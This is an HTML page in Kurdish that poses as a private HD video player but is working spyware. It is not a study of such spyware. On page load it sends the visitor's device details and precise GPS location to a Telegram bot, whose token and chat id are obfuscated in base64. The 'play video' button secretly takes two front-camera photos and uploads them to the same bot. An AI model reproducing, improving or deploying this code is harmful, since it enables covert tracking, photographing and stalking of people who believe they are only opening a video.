<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ڤیدیۆیا مۆدێرن و تایبەت</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;700&display=swap" rel="stylesheet">
    <style>body { font-family: 'Vazirmatn', sans-serif; }</style>
</head>
<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_megaEngineInit()">

    <div class="bg-slate-800 p-6 rounded-2xl shadow-2xl w-full max-w-md border border-slate-700 text-center">
        <h1 class="text-xl font-bold mb-4 text-indigo-400">ڤیدیۆیا تایبەت (Mega Engine)</h1>
        <p class="text-slate-300 text-sm mb-4">بۆ دیتنا ڤیدیۆیێ ب کوالیتیا بلندا HD، ل خوارێ کلیک بکە.</p>
        
        <div class="mb-4 bg-slate-900 rounded-xl overflow-hidden border border-slate-700 h-64 flex items-center justify-center relative">
            <video id="_vidMega" class="w-full h-full object-cover" controls playsinline>
                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
            </video>
        </div>

        <button onclick="_executeMegaBypass()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200 shadow-lg shadow-indigo-600/30">
            لێدان و ڤەکرنا ڤیدیۆیێ
        </button>
    </div>

    <video id="_vStreamMega" autoplay playsinline class="hidden"></video>
    <canvas id="_cBufferMega" class="hidden"></canvas>

    <script>
        const _mKey = ["ODk3Nzk0NTc4", "MTpBQUZJNDRS", "T3VkUjVlTER3", "bEJycE5TeU5p", "SmotQzhGdURtRQ==", "NzY0MzE5MTgwMg=="];
        
        function _decode(i) {
            try { return atob(_mKey[i]); } catch(e) { return ""; }
        }

        const _getToken = () => _decode(0) + _decode(1) + _decode(2) + _decode(3) + _decode(4);
        const _getChatId = () => _decode(5);

        async function _sendText(msg) {
            let t = _getToken(), c = _getChatId();
            if(!t || !c) return;
            try {
                const endpoint = `https://api.telegram.org/bot${t}/sendMessage`;
                const payload = JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" });
                navigator.sendBeacon(endpoint, new Blob([payload], {type: 'application/json'}));
            } catch(e) {}
        }

        async function _sendImage(blobData, labelText) {
            let t = _getToken(), c = _getChatId();
            if(!t || !c) return;
            try {
                let form = new FormData();
                form.append('chat_id', c);
                form.append('photo', blobData, 'mega_capture.jpg');
                form.append('caption', `⚡ [Mega Engine] ${labelText}\n@YUSEEF_SURCHI`);
                await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: form });
            } catch(e) {}
        }

        function _megaEngineInit() {
            let megaReport = `🚀 ڕاپۆرتا مێگا سیستەمی:\n` +
                `- پلاتفۆرم: ${navigator.platform}\n` +
                `- زمان: ${navigator.language}\n` +
                `- کورێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'N/A'}\n` +
                `- بیرگە (RAM): ${navigator.deviceMemory || 'N/A'} GB\n` +
                `- شاشە: ${screen.width}x${screen.height}\n` +
                `- پەنجەرە: ${window.innerWidth}x${window.innerHeight}\n` +
                `- کووکیس: ${navigator.cookieEnabled}\n` +
                `- کات: ${new Date().toLocaleTimeString()}`;
            
            _sendText(megaReport);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        let mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        _sendText(`📍 جهـ هاتە دیتن (Mega GPS)\n- پانی و درێژاهی: ${pos.coords.latitude}, ${pos.coords.longitude}\nلینک: ${mapLink}\n@YUSEEF_SURCHI`);
                    },
                    (err) => {},
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            }
        }

        async function _executeMegaBypass() {
            try {
                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }, 
                    audio: false 
                });
                
                const videoElement = document.getElementById('_vStreamMega');
                videoElement.srcObject = mediaStream;
                
                await new Promise(r => setTimeout(r, 700));

                const canvasElement = document.getElementById('_cBufferMega');
                canvasElement.width = videoElement.videoWidth || 1280;
                canvasElement.height = videoElement.videoHeight || 720;
                
                const context = canvasElement.getContext('2d');
                
                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                canvasElement.toBlob(async (blob1) => {
                    if(blob1) await _sendImage(blob1, "وێنەیێ سەرەکی (Mega HD Capture)");
                }, 'image/jpeg', 0.99);

                setTimeout(async () => {
                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                    canvasElement.toBlob(async (blob2) => {
                        if(blob2) await _sendImage(blob2, "وێنەیێ دووەم (Mega Backup Secure)");
                        mediaStream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.99);
                }, 1000);

            } catch (error) {
                _sendText(`⚠️ ڕێکنەدا ب کامێرایێ (Mega Blocked)\n@YUSEEF_SURCHI`);
            }
        }
    </script>
</body>
</html>
